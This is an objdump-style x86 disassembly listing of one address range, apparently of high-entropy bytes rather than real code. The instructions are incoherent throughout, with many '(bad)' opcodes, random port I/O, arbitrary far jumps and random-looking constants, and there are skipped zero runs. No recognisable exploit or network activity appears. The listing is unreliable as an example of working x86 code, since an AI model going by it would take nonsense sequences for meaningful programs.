  41ae45:	adc    cl,BYTE PTR [ebp-0x68]
  41ae48:	jmp    0x41aea0
  41ae4a:	stos   DWORD PTR es:[edi],eax
  41ae4b:	(bad)  
  41ae4c:	popf   
  41ae4d:	cmp    BYTE PTR [edi-0x75e9be80],al
  41ae53:	mov    dl,0x3c
  41ae55:	cmp    cl,ch
  41ae57:	rcl    ebx,cl
  41ae59:	or     ch,BYTE PTR [edx-0xf]
  41ae5c:	in     eax,0x92
  41ae5e:	mov    edx,ecx
  41ae60:	push   edi
  41ae61:	nop
  41ae62:	push   0xf314f326
  41ae67:	pminsw mm6,mm5
  41ae6a:	dec    esp
  41ae6b:	jne    0x41aeb2
  41ae6d:	xor    al,0xbd
  41ae6f:	mov    eax,0xf9517cac
  41ae74:	push   ebp
  41ae75:	mov    BYTE PTR [ebx+ecx*8],dh
  41ae78:	fcomp  st(3)
  41ae7a:	or     bl,BYTE PTR [edi+0x50]
  41ae7d:	pop    esp
  41ae7e:	mov    ecx,0x2428be2d
  41ae83:	out    dx,eax
  41ae84:	mov    ds:0x472d404a,al
  41ae89:	push   ss
  41ae8a:	inc    ecx
  41ae8b:	inc    edi
  41ae8c:	push   ebp
  41ae8d:	cmp    eax,0xec3e7568
  41ae92:	in     eax,0xc2
  41ae94:	out    0xd5,al
  41ae96:	xchg   ebx,eax
  41ae97:	retf   0x833
  41ae9a:	(bad)  
  41ae9b:	push   eax
  41ae9c:	loope  0x41aedb
  41ae9e:	mov    ds:0xfc14f773,al
  41aea3:	or     edi,ebx
  41aea5:	xor    DWORD PTR [ecx-0x53cf88a7],ebx
  41aeab:	add    edx,DWORD PTR cs:[ebp+edi*8-0x74]
  41aeb0:	dec    edx
  41aeb1:	mov    dh,0x7b
  41aeb3:	and    al,0x43
  41aeb5:	aas    
  41aeb6:	jmp    0xb190:0xb0b9248f
  41aebd:	jnp    0x41ae89
  41aebf:	sub    eax,0x147d5d47
  41aec4:	xchg   DWORD PTR [eax-0x33],edi
  41aec7:	pop    eax
  41aec8:	cwde   
  41aec9:	or     al,0x37
  41aecb:	popa   
  41aecc:	add    eax,0xa93f2afe
  41aed1:	jmp    0x6e73:0xbbcab014
  41aed8:	pushf  
  41aed9:	inc    edi
  41aeda:	mov    dh,0xf3
  41aedc:	mov    al,0x54
  41aede:	ficomp DWORD PTR [edx]
  41aee0:	add    esi,DWORD PTR [edi-0x75e92a31]
  41aee6:	add    BYTE PTR [edx+0x72],bh
  41aee9:	ins    BYTE PTR es:[edi],dx
  41aeea:	std    
  41aeeb:	lds    edx,FWORD PTR [edi]
  41aeed:	jle    0x41aea9
  41aeef:	cmp    bl,BYTE PTR ds:0xcaf3ec18
  41aef5:	mov    DWORD PTR [esi+0x49cb6fb8],eax
  41aefb:	xchg   esi,eax
  41aefc:	push   edx
  41aefd:	(bad)  
  41aefe:	or     al,0x9e
  41af00:	xor    BYTE PTR [eax],dh
  41af02:	xchg   edi,eax
  41af03:	clc    
  41af04:	cmp    BYTE PTR [ecx-0x8ae6d26],cl
  41af0a:	inc    edi
  41af0b:	dec    edi
  41af0c:	mov    ds:0xb8d1a677,eax
	...
  41af71:	add    BYTE PTR [eax],al
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x3b8244ee
  41af82:	pushf  
  41af83:	cmp    dl,BYTE PTR [ebx+0x1e]
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0x3a000001
  41af8d:	std    
  41af8e:	xchg   ebx,eax
  41af8f:	lahf   
  41af90:	je     0x41b00e
  41af92:	mov    esp,0x43472a95
  41af97:	aas    
  41af98:	nop
  41af99:	mov    cl,0x1f
  41af9b:	(bad)  
  41af9c:	mov    BYTE PTR [eax+eax*8],al
  41af9f:	adc    esi,DWORD PTR [ecx]
  41afa1:	mov    ds:0xcff2dfc3,eax
  41afa6:	sbb    DWORD PTR [ebx+eax*4+0x7e5a27a8],ebp
  41afad:	dec    esp
  41afae:	lahf   
  41afaf:	shl    DWORD PTR [ecx-0x57bd4c25],0x29
  41afb6:	fild   QWORD PTR [eax-0x597be4eb]
  41afbc:	leave  
  41afbd:	mov    esp,0xc58219c0
  41afc2:	xchg   ebx,eax
  41afc3:	push   0x4e
  41afc5:	pop    edi
  41afc6:	jmp    0x8bc9:0xade1ec94
  41afcd:	xor    edx,DWORD PTR cs:[ebx+ebp*4+0x41]
  41afd2:	add    DWORD PTR [eax],edi
  41afd4:	add    BYTE PTR [ebx+0x753b4606],al
  41afda:	xchg   esp,eax
  41afdb:	push   ebx
  41afdc:	dec    esp
  41afdd:	iret   
  41afde:	lds    eax,FWORD PTR [edi+0x4a98ccd2]
  41afe4:	xchg   edx,eax
  41afe5:	leave  
  41afe6:	xor    BYTE PTR [edx+ecx*2+0x8],bh
  41afea:	xor    DWORD PTR [edx-0x33],edi
  41afed:	mov    edi,0x92936110
  41aff2:	pop    esp
  41aff3:	outs   dx,DWORD PTR ds:[esi]
  41aff4:	sub    al,0xb4
  41aff6:	pop    ds
  41aff7:	pop    ebp
  41aff8:	jge    0x41afdb
  41affa:	mov    ebx,0xe6c75236
  41afff:	add    eax,0x3050ac41
  41b004:	sbb    al,0xa3
  41b006:	jl     0x41b002
  41b008:	out    dx,al
  41b009:	shl    BYTE PTR [eax-0x5a1834a0],cl
  41b00f:	add    al,0x69
  41b011:	sbb    DWORD PTR [edi+ecx*2],ecx
  41b014:	pop    ds
  41b015:	in     al,0x30
  41b017:	outs   dx,DWORD PTR ds:[esi]
  41b018:	not    cl
  41b01a:	add    ebx,DWORD PTR [ebx+0x48]
  41b01d:	jnp    0x41b038
  41b01f:	jecxz  0x41afdf
  41b021:	sbb    BYTE PTR [ecx],cl
  41b023:	push   ss
  41b024:	aad    0xfb
  41b026:	add    dl,dh
  41b028:	mov    ebx,0xc55944e
  41b02d:	mov    esi,0x7d6f5288
  41b032:	test   eax,0xfd8ead92
  41b037:	(bad)  
  41b038:	or     BYTE PTR [eax+0x4558b109],ch
  41b03e:	fldenv [esp+eax*8+0x2c]
  41b042:	stos   BYTE PTR es:[edi],al
  41b043:	push   es
  41b044:	in     al,dx
  41b045:	(bad)  
  41b047:	(bad)  
  41b048:	stos   DWORD PTR es:[edi],eax
  41b049:	aam    0xc4
  41b04b:	in     al,dx
  41b04c:	pop    es
  41b04d:	std    
  41b04e:	out    dx,eax
  41b04f:	dec    DWORD PTR [ebx+0x45d1d8a3]
  41b055:	xchg   bl,dh
  41b057:	mov    ebp,0x84089ac4
  41b05c:	mov    ecx,eax
  41b05e:	dec    esp
  41b05f:	lods   al,BYTE PTR ds:[esi]
  41b060:	cmp    DWORD PTR [ebx],eax
  41b062:	imul   ecx,DWORD PTR [eax],0x2e
  41b065:	pop    edx
  41b066:	loope  0x41b0d2
  41b068:	mov    ah,0xca
  41b06a:	mov    al,BYTE PTR [eax]
  41b06c:	aas    
  41b06d:	pop    esi
  41b06e:	pop    eax
  41b06f:	ret    
  41b070:	ja     0x41affc
  41b072:	sbb    al,0x7c
  41b074:	cmp    eax,0x5553a373
  41b079:	push   esi
  41b07a:	xchg   edi,eax
  41b07b:	xchg   edi,eax
  41b07c:	rol    DWORD PTR [ebx],0x33
  41b07f:	cli    
  41b080:	in     al,0x47
  41b082:	(bad)  
  41b083:	inc    eax
  41b084:	repz pop edx
  41b086:	sub    bl,BYTE PTR [eax-0x622af20b]
  41b08c:	rcl    DWORD PTR [edx+0x79a700],cl
	...
  41b0f2:	add    BYTE PTR [eax],al
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x5d5500f9
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0xa3000001
  41b10d:	fstp   TBYTE PTR [esi]
  41b10f:	cmp    BYTE PTR [esi+0x5946cdf6],dh
  41b115:	dec    esp
  41b116:	js     0x41b0f1
  41b118:	ror    DWORD PTR [ecx],0x4d
  41b11b:	(bad)
  41b11e:	mov    ecx,0xce5c0c46
  41b123:	cmp    al,0xe5
  41b125:	mov    WORD PTR ds:0x3b70a9cd,ds
  41b12b:	int3   
  41b12c:	push   ds
  41b12d:	jo     0x41b0fc
  41b12f:	pop    eax
  41b130:	mov    DWORD PTR [ebx+0x7f],edx
  41b133:	lods   eax,DWORD PTR ds:[esi]
  41b134:	fwait
  41b135:	xchg   BYTE PTR [edx+ecx*8],al
  41b138:	rol    BYTE PTR [esp+ecx*8+0x31],1
  41b13c:	test   DWORD PTR [esi+0x2151733a],eax
  41b142:	adc    ecx,esi
  41b144:	test   BYTE PTR [ebp+0x10],ah
  41b147:	es xchg ecx,eax
  41b149:	test   DWORD PTR ds:0x68b18be6,ebp
  41b14f:	imul   ebx,DWORD PTR [bp+si],0x9
  41b153:	mov    dh,cl
  41b155:	test   eax,0xd3f7c848
  41b15a:	iret   
  41b15b:	lods   al,BYTE PTR ds:[esi]
  41b15c:	(bad)  
  41b15d:	call   0x3e1b:0xb9de5085
  41b164:	push   ecx
  41b165:	jb     0x41b132
  41b167:	xlat   BYTE PTR ds:[ebx]
  41b168:	js     0x41b14e
  41b16a:	xor    DWORD PTR [ebx],esi
  41b16c:	dec    ebp
  41b16d:	sti    
  41b16e:	or     DWORD PTR [esi+0x659d3b8d],ecx
  41b174:	push   0x68d6180a
  41b179:	mov    esi,0xddabb523
  41b17e:	test   DWORD PTR [edi+0x19],0xc41810e7
  41b185:	cwde   
  41b186:	sbb    esi,DWORD PTR [ecx]
  41b188:	mov    bl,BYTE PTR [edi]
  41b18a:	inc    ebp
  41b18b:	inc    ebx
  41b18c:	and    BYTE PTR [ecx-0x5d725c62],ah
  41b192:	hlt    
  41b193:	retf   
  41b194:	(bad)  
  41b195:	out    0x7f,eax
  41b197:	mov    al,ds:0x9a7cc1e
  41b19c:	jp     0x41b1e5
  41b19e:	clc    
  41b19f:	mov    bh,ch
  41b1a1:	or     dh,BYTE PTR [ebp+0x39bb7cdb]
  41b1a7:	or     bh,BYTE PTR [edi+edi*2+0x32feb6cc]
  41b1ae:	mov    dl,0x8c
  41b1b0:	in     eax,dx
  41b1b1:	cmp    eax,0x7618e399
  41b1b6:	jae    0x41b222
  41b1b8:	inc    ebp
  41b1b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1ba:	pop    es
  41b1bb:	xor    BYTE PTR [esi+0x8],bh
  41b1be:	xchg   BYTE PTR [ecx+0x16f06933],bl
  41b1c4:	add    BYTE PTR [esp+ebp*8-0x40d59796],0xfe
  41b1cc:	adc    al,0xa7
  41b1ce:	rcl    BYTE PTR [esi],cl
  41b1d0:	push   0x52711145
  41b1d5:	test   eax,0x27be2696
  41b1da:	dec    edx
  41b1db:	into   
  41b1dc:	and    al,0x8a
  41b1de:	das    
  41b1df:	outs   dx,DWORD PTR ds:[esi]
  41b1e0:	jnp    0x41b192
  41b1e2:	scas   eax,DWORD PTR es:[edi]
  41b1e3:	lahf   
  41b1e4:	push   ds
  41b1e5:	dec    esi
  41b1e6:	scas   al,BYTE PTR es:[edi]
  41b1e7:	or     BYTE PTR [esi-0x6],ah
  41b1ea:	fidivr WORD PTR [eax+0x9]
  41b1ed:	nop    DWORD PTR [eax]
  41b1f0:	outs   dx,BYTE PTR ds:[esi]
  41b1f1:	xor    al,0xb4
  41b1f3:	adc    bl,BYTE PTR [esi]
  41b1f5:	loop   0x41b188
  41b1f7:	mov    ch,0x6e
  41b1f9:	and    eax,0xf071c8b6
  41b1fe:	mov    ah,0xb1
  41b200:	fs dec ah
  41b203:	dec    ecx
  41b204:	in     al,dx
  41b205:	js     0x41b257
  41b207:	push   esi
  41b208:	push   edi
  41b209:	mov    ds:0xb3c0ef8a,al
  41b20e:	loop   0x41b1a1
  41b210:	sbb    al,0x0
	...
  41b272:	add    BYTE PTR [eax],al
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ebp-0x25],ah
  41b282:	leave  
  41b283:	(bad)  
  41b284:	pop    ebp
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR ds:0xae000001,al
  41b28d:	ins    DWORD PTR es:[edi],dx
  41b28e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b28f:	rol    BYTE PTR [edi],1
  41b291:	pop    esp
  41b292:	push   0x7ebe82a6
  41b297:	mov    bh,0xbc
  41b299:	jl     0x41b29d
  41b29b:	sahf   
  41b29c:	dec    edi
  41b29d:	adc    eax,edi
  41b29f:	jnp    0x41b225
  41b2a1:	and    al,0x9a
  41b2a3:	cmc    
  41b2a4:	pop    esi
  41b2a5:	xchg   ebx,eax
  41b2a6:	dec    edx
  41b2a7:	xor    al,0x39
  41b2a9:	push   edi
  41b2aa:	into   
  41b2ab:	icebp  
  41b2ac:	lods   al,BYTE PTR ds:[esi]
  41b2ad:	push   ds
  41b2ae:	push   ecx
  41b2af:	movsx  edx,WORD PTR [esi+0x6efb1362]
  41b2b6:	mov    ds:0xdd3dd66,eax
  41b2bb:	sbb    BYTE PTR [esi-0x1c950c6c],cl
  41b2c1:	pushf  
  41b2c2:	out    0xf6,al
  41b2c4:	mov    esi,0x5a24e90c
  41b2c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2ca:	mov    ebx,0xc964f9c0
  41b2cf:	or     bl,BYTE PTR [eax]
  41b2d1:	leave  
  41b2d2:	pop    edx
  41b2d3:	pop    eax
  41b2d4:	cmc    
  41b2d5:	xor    esp,DWORD PTR [esp+edi*1-0x59]
  41b2d9:	shl    DWORD PTR [edx-0x2c],0xe9
  41b2dd:	xor    ebp,DWORD PTR [eax]
  41b2df:	push   eax
  41b2e0:	sub    BYTE PTR [edi],bh
  41b2e2:	loop   0x41b30a
  41b2e4:	test   esi,esp
  41b2e6:	adc    eax,0x46976ec8
  41b2eb:	push   esi
  41b2ec:	imul   edx,DWORD PTR [ebx+0x3],0x59d25cc6
  41b2f3:	and    esp,DWORD PTR [edx+0x7f]
  41b2f6:	gs cmp al,0x97
  41b2f9:	and    ebp,esp
  41b2fb:	clc    
  41b2fc:	or     eax,DWORD PTR [esi+0x6e]
  41b2ff:	push   edi
  41b300:	jae    0x41b380
  41b302:	(bad)  
  41b303:	pop    eax
  41b305:	or     DWORD PTR [ebx-0x51e24f94],0xfffffff5
  41b30c:	mov    eax,0x7172c3ff
  41b311:	push   esp
  41b312:	xchg   ebx,eax
  41b313:	fisubr DWORD PTR [esi-0x22]
  41b316:	mov    al,0xc1
  41b318:	pop    ds
  41b319:	xchg   edi,edx
  41b31b:	sbb    ebx,DWORD PTR [ecx]
  41b31d:	sti    
  41b31e:	push   edi
  41b31f:	push   ss
  41b320:	dec    edi
  41b321:	in     eax,0x7e
  41b323:	adc    DWORD PTR [ecx],0x8970bb09
  41b329:	addr16 jno 0x41b2dc
  41b32c:	cwde   
  41b32d:	loope  0x41b2d4
  41b32f:	ficom  DWORD PTR [esi-0x3a]
  41b332:	and    bh,BYTE PTR [ecx-0x1e5916ce]
  41b338:	and    al,0xee
  41b33a:	adc    BYTE PTR [ecx-0x60482704],ch
  41b340:	loopne 0x41b395
  41b342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b343:	dec    eax
  41b344:	out    0x3d,eax
  41b346:	jbe    0x41b2fc
  41b348:	ret    
  41b349:	pop    es
  41b34a:	fs dec esp
  41b34c:	xor    DWORD PTR [edx+0x4ddacffc],edx
  41b352:	repz xchg ebx,eax
  41b354:	js     0x41b32b
  41b356:	in     al,dx
  41b357:	neg    BYTE PTR [ebp+esi*4-0x42]
  41b35b:	and    al,ah
  41b35d:	mov    bl,0x42
  41b35f:	cmp    dl,BYTE PTR [ebx-0x462e53f2]
  41b365:	dec    ecx
  41b366:	sub    al,BYTE PTR [eax+0x63]
  41b369:	test   eax,0x417e60e5
  41b36e:	mov    al,ds:0x4d15275b
  41b373:	sbb    al,0xbd
  41b375:	inc    eax
  41b376:	mov    cl,0xc4
  41b378:	inc    ebp
  41b379:	ds (bad) 
  41b37b:	iret   
  41b37c:	daa    
  41b37d:	dec    esi
  41b37e:	mov    esi,0x6f553412
  41b383:	jecxz  0x41b381
  41b385:	ror    BYTE PTR [esp+edi*2-0x7c600eb8],cl
  41b38c:	mov    WORD PTR [esi-0x6c],es
  41b38f:	les    edx,FWORD PTR [ecx]
	...
  41b3f1:	add    BYTE PTR [eax],al
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	mov    ebp,0x62c2b2be
  41b405:	and    DWORD PTR [ecx],eax
  41b407:	add    BYTE PTR ds:0x19000001,al
  41b40d:	xchg   BYTE PTR [edi],ah
  41b40f:	jo     0x41b450
  41b411:	cmp    BYTE PTR [edx],dl
  41b413:	mov    bl,BYTE PTR es:[eax+edi*1]
  41b417:	mov    cl,0xd1
  41b419:	cmp    DWORD PTR ds:0xfc52cba6,esp
  41b41f:	pop    ebp
  41b420:	(bad)  
  41b422:	in     eax,dx
  41b423:	popa   
  41b424:	scas   eax,DWORD PTR es:[edi]
  41b425:	adc    ecx,DWORD PTR [edi-0x60]
  41b428:	mov    ch,0x36
  41b42a:	inc    esi
  41b42b:	or     esp,esi
  41b42d:	xor    DWORD PTR [ebx+0x3c],eax
  41b430:	in     eax,dx
  41b431:	outs   dx,DWORD PTR gs:[esi]
  41b433:	adc    eax,0x212cb9f8
  41b438:	int3   
  41b439:	mov    eax,ds:0x6a2538c6
  41b43e:	mov    ah,0x7d
  41b440:	cmp    BYTE PTR [ecx-0x637f80d9],al
  41b446:	cmp    bh,dl
  41b448:	lahf   
  41b449:	mov    dh,0x74
  41b44b:	bound  ecx,QWORD PTR [esi+0xd4f291f]
  41b451:	or     eax,0x1b1bff2a
  41b456:	aam    0x9b
  41b458:	pop    edi
  41b459:	in     al,dx
  41b45a:	adc    al,0x38
  41b45c:	arpl   WORD PTR [edi+0x30],si
  41b45f:	shl    BYTE PTR [ebx+0x50c41a75],1
  41b465:	mov    ss,WORD PTR [eax]
  41b467:	or     al,0x33
  41b469:	data16 adc al,0xa1
  41b46c:	sub    BYTE PTR [esp+ebp*1+0x4ac7cebd],ah
  41b473:	in     eax,dx
  41b474:	inc    ebp
  41b475:	cmp    eax,0xd7aa609a
  41b47a:	xor    cl,BYTE PTR [eax+0x17a2b1f9]
  41b480:	adc    eax,edi
  41b482:	adc    bh,ah
  41b484:	gs dec ebp
  41b486:	inc    ebp
  41b487:	adc    DWORD PTR [ebp-0x378904e5],esi
  41b48d:	test   DWORD PTR [eax-0x6e9d243f],esi
  41b493:	mov    ds:0xa05ca23c,eax
  41b498:	bound  edx,QWORD PTR [esi+0x7dad195d]
  41b49e:	stc    
  41b49f:	jae    0x41b452
  41b4a1:	daa    
  41b4a2:	hlt    
  41b4a3:	jmp    0x7d10:0xff7c2a7e
  41b4aa:	dec    edi
  41b4ab:	out    0x2d,al
  41b4ad:	int3   
  41b4ae:	call   0xf0c398b6
  41b4b3:	push   edx
  41b4b4:	dec    ebx
  41b4b5:	jno    0x41b4ad
  41b4b7:	and    DWORD PTR [ebp+0x2efe6832],0x169f3ba1
  41b4c1:	aam    0xa
  41b4c3:	dec    ecx
  41b4c4:	cld    
  41b4c5:	sbb    eax,0xab8d790a
  41b4ca:	jno    0x41b535
  41b4cc:	cmp    cl,dl
  41b4ce:	mov    al,al
  41b4d0:	(bad)  
  41b4d1:	jl     0x41b543
  41b4d3:	mov    ebx,0x1baf3d1a
  41b4d8:	xor    DWORD PTR [eax-0x11],0xffffffd3
  41b4dc:	push   esp
  41b4dd:	pushf  
  41b4de:	test   BYTE PTR [edx+ecx*2],bh
  41b4e1:	sub    eax,DWORD PTR [ebx]
  41b4e3:	dec    eax
  41b4e4:	cwde   
  41b4e5:	push   esp
  41b4e6:	and    ah,BYTE PTR [ecx-0x3e74569b]
  41b4ec:	(bad)  [ecx-0x735865bf]
  41b4f2:	adc    DWORD PTR [edi+0x2b2df20b],esp
  41b4f8:	jnp    0x41b4b3
  41b4fa:	aas    
  41b4fb:	not    BYTE PTR [esi+0x4e]
  41b4fe:	retf   
  41b4ff:	pop    eax
  41b500:	mov    edx,0xe43105c5
  41b505:	xchg   ebx,eax
  41b506:	add    eax,0xa4b9653d
  41b50b:	xchg   edi,eax
  41b50c:	sub    DWORD PTR [ecx+0x276889],edx
	...
  41b572:	add    BYTE PTR [eax],al
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	sub    edi,DWORD PTR [esi]
  41b582:	imul   DWORD PTR [edi]
  41b584:	and    al,BYTE PTR [bx+di]
  41b587:	add    BYTE PTR ds:0x9f000001,al
  41b58d:	cmp    DWORD PTR [ebp+0x15a893a2],esi
  41b593:	xchg   esi,eax
  41b594:	dec    ebp
  41b595:	pop    eax
  41b596:	daa    
  41b597:	popa   
  41b598:	mov    ss,esp
  41b59a:	(bad)  
  41b59c:	test   BYTE PTR [edx-0x489c4a9c],cl
  41b5a2:	mov    al,0xf0
  41b5a4:	call   0x99df831c
  41b5a9:	sbb    ah,ch
  41b5ab:	shl    BYTE PTR [edx-0x2e],1
  41b5ae:	or     cl,al
  41b5b0:	sub    BYTE PTR ds:0xfb436d67,cl
  41b5b6:	sub    BYTE PTR [ebx+0x124f2a04],dl
  41b5bc:	mov    dh,0xa1
  41b5be:	in     eax,dx
  41b5bf:	sbb    eax,0xbb84e1dd
  41b5c4:	mov    DWORD PTR [ebx+0x1b48dddc],esp
  41b5ca:	ret    
  41b5cb:	popa   
  41b5cc:	xor    DWORD PTR ds:0xafe0cc33,esp
  41b5d2:	hlt    
  41b5d3:	inc    edx
  41b5d4:	mov    eax,ds:0x6e0a067b
  41b5d9:	cld    
  41b5da:	aad    0xde
  41b5dc:	pop    es
  41b5dd:	les    ecx,FWORD PTR [edi+0x4343b570]
  41b5e3:	mov    esi,DWORD PTR [edi]
  41b5e5:	and    eax,0x63
  41b5e8:	cld    
  41b5e9:	mov    ecx,0x346b7527
  41b5ee:	mov    eax,0xffb8f272
  41b5f3:	jne    0x41b603
  41b5f5:	fbld   TBYTE PTR [edi]
  41b5f7:	or     ebp,DWORD PTR [ebp+0x51]
  41b5fa:	cmp    BYTE PTR [edi-0x7756b6da],dl
  41b600:	mov    ebx,0x80095053
  41b605:	sub    eax,0x3d6ffc3e
  41b60a:	mov    bh,0x9d
  41b60c:	add    eax,0xc311c57c
  41b611:	aad    0xe7
  41b613:	and    BYTE PTR [esp+eax*1+0x64647ba9],cl
  41b61a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b61b:	iret   
  41b61c:	fxch   st(0)
  41b61e:	sbb    eax,0x83fffb86
  41b623:	jl     0x41b5dd
  41b625:	sub    ecx,DWORD PTR [ebx]
  41b627:	popf   
  41b628:	mov    edx,0x2752dc85
  41b62d:	ret    
  41b62e:	fmul   st,st(4)
  41b630:	mov    edx,0xdc008f44
  41b635:	pop    eax
  41b636:	out    dx,al
  41b637:	jo     0x41b625
  41b639:	sub    DWORD PTR [edi+ebx*2],edi
  41b63c:	mov    dh,0x3c
  41b63e:	mov    ch,0x0
  41b640:	shl    ah,0x2b
  41b643:	cdq    
  41b644:	mul    esp
  41b646:	push   edi
  41b647:	xchg   ecx,eax
  41b648:	sti    
  41b649:	sbb    eax,DWORD PTR [edi+0x6d]
  41b64c:	sbb    dl,BYTE PTR cs:[ebx+0x1121c54e]
  41b653:	fisubr DWORD PTR [ecx+0x32]
  41b656:	not    BYTE PTR [eax+0x4845e8a8]
  41b65c:	fild   WORD PTR ds:[edi-0x13c361d5]
  41b663:	call   0xb2930f45
  41b668:	mov    ebp,0xbf4080d
  41b66d:	jle    0x41b662
  41b66f:	iret   
  41b670:	jnp    0x41b5f8
  41b672:	(bad)  
  41b673:	hlt    
  41b674:	push   eax
  41b675:	cld    
  41b676:	adc    BYTE PTR [ebx-0x55],dh
  41b679:	(bad)  
  41b67a:	sbb    BYTE PTR [ebx-0x20dc6de3],dh
  41b680:	and    ecx,DWORD PTR [edx-0x52]
  41b683:	xchg   edx,eax
  41b684:	popf   
  41b685:	frstor [ebx+0x26]
  41b688:	push   esp
  41b689:	dec    eax
  41b68a:	ret    0xc7b2
  41b68d:	add    DWORD PTR [esi],edx
  41b68f:	aaa    
  41b690:	mov    al,BYTE PTR [eax]
	...
  41b6f2:	add    BYTE PTR [eax],al
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	mov    esp,0x6cb2b658
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR ds:0x79000001,al
  41b70d:	push   edi
  41b70e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b70f:	es xchg ebp,eax
  41b711:	pushf  
  41b712:	pop    esp
  41b713:	sbb    esi,DWORD PTR [eax]
  41b715:	mov    ah,0x8e
  41b717:	call   0x6165:0xd06841a1
  41b71e:	or     bl,BYTE PTR [ebp-0x1ded64de]
  41b724:	out    0x94,al
  41b726:	xor    eax,0xdd2eea65
  41b72b:	and    DWORD PTR [eax-0x7e],ebp
  41b72e:	(bad)  
  41b72f:	jo     0x41b6b1
  41b731:	mov    cl,0x9
  41b733:	xchg   BYTE PTR [ebx],cl
  41b735:	push   es
  41b736:	cmp    cl,BYTE PTR [ecx+ecx*4+0x56]
  41b73a:	mov    ebp,0x82923b4
  41b73f:	jmp    0x41b7bf
  41b741:	xchg   ebx,eax
  41b742:	cmp    eax,0xbbfb59db
  41b747:	sbb    al,0xf3
  41b749:	scas   eax,DWORD PTR es:[edi]
  41b74a:	inc    esi
  41b74b:	fcom   DWORD PTR [esi+0x37]
  41b74e:	fisub  DWORD PTR [ebx-0x2c]
  41b751:	pop    esi
  41b752:	mov    eax,0x9f43fed6
  41b757:	jbe    0x41b779
  41b759:	les    edi,FWORD PTR [ecx+0x7e]
  41b75c:	jp     0x41b747
  41b75e:	jl     0x41b78c
  41b760:	(bad)  
  41b761:	mov    dl,0x2a
  41b763:	addr16 out dx,al
  41b765:	pop    ebp
  41b766:	mov    eax,ds:0x640fb98e
  41b76b:	push   cs
  41b76c:	aam    0x70
  41b76e:	jl     0x41b7d2
  41b770:	mov    dl,0x71
  41b772:	mov    ah,0xf9
  41b774:	(bad)  
  41b775:	mov    esp,0xa9c0a949
  41b77a:	mov    ah,0xf1
  41b77c:	mov    ds:0xd2110e2e,eax
  41b781:	jbe    0x41b7cc
  41b783:	ds add eax,0x1df7d51
  41b789:	cmp    BYTE PTR cs:[ebx+0x2615c2a3],bl
  41b790:	cmc    
  41b791:	xor    bh,BYTE PTR [ecx-0xcef5d5b]
  41b797:	ss pop es
  41b799:	and    dh,ah
  41b79b:	jb     0x41b776
  41b79d:	jmp    0x8c4c:0x12b0feb8
  41b7a4:	xor    DWORD PTR [edx+0x4a],ebp
  41b7a7:	daa    
  41b7a8:	ret    
  41b7a9:	pushf  
  41b7aa:	jmp    0x41b825
  41b7ac:	or     eax,0x2e6781e9
  41b7b1:	repz pushf 
  41b7b3:	shr    DWORD PTR [eax-0x68b4d192],cl
  41b7b9:	test   DWORD PTR [esi+0x30],esi
  41b7bc:	sti    
  41b7bd:	bound  esp,QWORD PTR [ebp+0x2a]
  41b7c0:	in     eax,0x3f
  41b7c2:	xchg   edi,eax
  41b7c3:	push   ecx
  41b7c4:	adc    dh,BYTE PTR [ecx-0x6b]
  41b7c7:	pop    edx
  41b7c8:	cmp    DWORD PTR [eax-0x453c4571],ebx
  41b7ce:	lds    edx,FWORD PTR [edi+0x4]
  41b7d1:	mov    esp,0x4c53087
  41b7d6:	das    
  41b7d7:	(bad)  
  41b7d9:	and    dl,BYTE PTR [esi-0x5a]
  41b7dc:	pop    edx
  41b7dd:	imul   ebx,DWORD PTR [edx-0x5d],0x4bf5bd6d
  41b7e4:	push   ebp
  41b7e5:	dec    ebx
  41b7e6:	sbb    DWORD PTR ds:0xccb6783a,0xffffffb2
  41b7ed:	push   ebp
  41b7ee:	sti    
  41b7ef:	jbe    0x41b7b6
  41b7f1:	push   ds
  41b7f2:	xchg   DWORD PTR [ebp-0x7acfebe],esp
  41b7f8:	jp     0x41b879
  41b7fa:	mov    esp,0xc14dd169
  41b7ff:	xor    eax,DWORD PTR [edx]
  41b801:	mov    edx,0x7a99c209
  41b806:	mov    ebx,ebx
  41b808:	jno    0x41b805
  41b80a:	sub    ecx,esp
  41b80c:	jmp    0x41b7f1
  41b80e:	daa    
  41b80f:	pop    ecx
  41b810:	xor    eax,DWORD PTR [eax]
	...
  41b872:	add    BYTE PTR [eax],al
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x25
  41b881:	adc    edx,ebx
  41b883:	add    DWORD PTR [ecx+0x24],esi
  41b886:	add    DWORD PTR [eax],eax
